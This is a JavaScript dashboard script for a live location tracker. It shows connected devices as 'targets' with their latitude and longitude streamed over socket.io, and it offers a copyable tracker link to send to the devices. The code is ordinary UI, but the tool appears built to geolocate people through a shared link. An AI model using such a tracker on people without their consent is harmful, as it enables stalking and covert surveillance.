const targetList = document.getElementById("targetList");
const searchInput = document.getElementById("searchInput");
const emptyState = document.getElementById("emptyState");
const statTotal = document.getElementById("statTotal");
const statActive = document.getElementById("statActive");
const statPings = document.getElementById("statPings");
const toast = document.getElementById("toast");
const toastMsg = document.getElementById("toastMsg");

const TARGETS = new Map();
let pingCount = 0;

const BASE = (window.baseURL || "").replace(/\/+$/, "") || "";

try {
  const wh = document.getElementById("webhookUrl");
  if (wh && BASE) {
    const tracker = BASE.endsWith("/tracker.html") ? BASE : `${BASE}/tracker.html`;
    wh.value = tracker;
  }
} catch (e) {}

const socket = io(BASE || undefined, {
  path: "/socket.io",
  transports: ["websocket", "polling"],
  reconnection: true,
  reconnectionAttempts: 10,
  reconnectionDelay: 1000,
});

socket.on("connect", () => {
  console.log("[Socket] Connected to server");
});

socket.on("disconnect", () => {
  console.warn("[Socket] Disconnected from server");
});

socket.on("user-connected", (newId) => {
  if (!TARGETS.has(newId)) {
    addTargetToUI(newId, null);
    TARGETS.set(newId, null);
    showToast(`New device connected: ${newId}`);
  }
  updateStats();
});

socket.on("map-data", (data) => {
  TARGETS.set(data.id, [data.lat, data.lng]);
  updateTargetCoords(data.id, data.lat, data.lng);
  pingCount++;
  if (statPings) statPings.textContent = formatCount(pingCount);
  updateStats();
});

function formatCount(n) {
  if (n >= 1000) return (n / 1000).toFixed(1) + "K";
  return String(n);
}

function addTargetToUI(id, coords) {
  if (document.querySelector(`[data-target-id="${id}"]`)) return;

  if (emptyState) emptyState.style.display = "none";

  const card = document.createElement("a");
  card.href = `map.html?id=${encodeURIComponent(id)}`;
  card.setAttribute("data-target-id", id);
  card.className = `target-card group block p-4 sm:p-5 rounded-2xl bg-white border border-slate-200 hover:border-sky-300 hover:shadow-md smooth shadow-sm`;

  const lat = coords ? parseFloat(coords[0]).toFixed(4) : "--";
  const lng = coords ? parseFloat(coords[1]).toFixed(4) : "--";

  card.innerHTML = `
    <div class="flex items-center gap-4">
      <div class="relative flex-shrink-0">
        <div class="w-12 h-12 sm:w-14 sm:h-14 rounded-2xl bg-gradient-to-br from-sky-100 to-cyan-100 border border-sky-200 flex items-center justify-center">
          <i class="fa-solid fa-mobile-screen-button text-sky-500 text-xl"></i>
        </div>
        <div class="absolute -bottom-0.5 -right-0.5 w-4 h-4 rounded-full bg-emerald-500 border-2 border-white pulse-dot"></div>
      </div>
      <div class="flex-1 min-w-0">
        <div class="flex items-center gap-2 mb-1.5 flex-wrap">
          <h3 class="font-extrabold text-slate-800 text-base sm:text-lg truncate">${escapeHtml(id)}</h3>
          <span class="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[10px] sm:text-xs font-bold bg-emerald-50 border border-emerald-200 text-emerald-700">
            <span class="w-1.5 h-1.5 rounded-full bg-emerald-500"></span>
            LIVE
          </span>
        </div>
        <div class="flex flex-wrap gap-x-4 gap-y-1 text-xs sm:text-sm text-slate-500">
          <span class="flex items-center gap-1.5 target-lat">
            <i class="fa-solid fa-location-crosshairs text-slate-400 text-[11px]"></i>
            Lat: <code class="px-2 py-0.5 rounded-md bg-sky-50 text-sky-700 border border-sky-100 font-mono text-[11px]">${lat}</code>
          </span>
          <span class="flex items-center gap-1.5 target-lng">
            <i class="fa-solid fa-location-crosshairs text-slate-400 text-[11px]"></i>
            Lng: <code class="px-2 py-0.5 rounded-md bg-sky-50 text-sky-700 border border-sky-100 font-mono text-[11px]">${lng}</code>
          </span>
        </div>
      </div>
      <div class="hidden sm:flex items-center justify-center w-12 h-12 rounded-2xl bg-slate-50 border border-slate-200 text-slate-400 group-hover:bg-gradient-to-br group-hover:from-sky-500 group-hover:to-cyan-500 group-hover:border-transparent group-hover:text-white smooth">
        <i class="fa-solid fa-arrow-right-long"></i>
      </div>
      <div class="sm:hidden flex-shrink-0">
        <i class="fa-solid fa-chevron-right text-slate-400 text-sm"></i>
      </div>
    </div>
  `;

  targetList.prepend(card);
}

function updateTargetCoords(id, lat, lng) {
  const card = document.querySelector(`[data-target-id="${id}"]`);
  if (!card) {
    addTargetToUI(id, [lat, lng]);
    return;
  }
  const latEl = card.querySelector(".target-lat code");
  const lngEl = card.querySelector(".target-lng code");
  if (latEl) latEl.textContent = parseFloat(lat).toFixed(4);
  if (lngEl) lngEl.textContent = parseFloat(lng).toFixed(4);
}

function updateStats() {
  const total = TARGETS.size;
  const active = Array.from(TARGETS.values()).filter((v) => v !== null).length;
  animateNumber(statTotal, total);
  animateNumber(statActive, active);
}

function animateNumber(el, target) {
  const current = parseInt(el.textContent.replace(/[^0-9]/g, ""), 10) || 0;
  if (current === target) return;
  const duration = 400;
  const start = performance.now();
  const from = current;
  const step = (t) => {
    const p = Math.min(1, (t - start) / duration);
    const ease = 1 - Math.pow(1 - p, 3);
    el.textContent = Math.round(from + (target - from) * ease);
    if (p < 1) requestAnimationFrame(step);
  };
  requestAnimationFrame(step);
}

searchInput.addEventListener("input", (e) => {
  const filter = e.target.value.toLowerCase().trim();
  const cards = targetList.querySelectorAll('[data-target-id]');
  cards.forEach((card) => {
    const id = card.getAttribute("data-target-id").toLowerCase();
    card.style.display = id.includes(filter) ? "" : "none";
  });
});

function copyWebhook() {
  const input = document.getElementById("webhookUrl");
  const btn = document.getElementById("copyBtn");
  const doCopy = () => {
    const icon = btn.querySelector("i");
    const txt = btn.querySelector("span");
    icon.classList.remove("fa-copy");
    icon.classList.add("fa-check");
    txt.textContent = "Copied!";
    showToast("Device link copied to clipboard!");
    setTimeout(() => {
      icon.classList.remove("fa-check");
      icon.classList.add("fa-copy");
      txt.textContent = "Copy Link";
    }, 2200);
  };
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(input.value).then(doCopy).catch(() => {
      input.select();
      document.execCommand("copy");
      doCopy();
    });
  } else {
    input.select();
    document.execCommand("copy");
    doCopy();
  }
}

function showToast(message) {
  toastMsg.textContent = message;
  toast.classList.remove("translate-y-24", "opacity-0");
  clearTimeout(window._toastTimer);
  window._toastTimer = setTimeout(() => {
    toast.classList.add("translate-y-24", "opacity-0");
  }, 3000);
}

function escapeHtml(str) {
  const div = document.createElement("div");
  div.textContent = str;
  return div.innerHTML;
}

if (typeof initialTargets !== "undefined" && initialTargets) {
  Object.entries(initialTargets).forEach(([id, coords]) => {
    TARGETS.set(id, coords);
    addTargetToUI(id, coords);
  });
  updateStats();
}
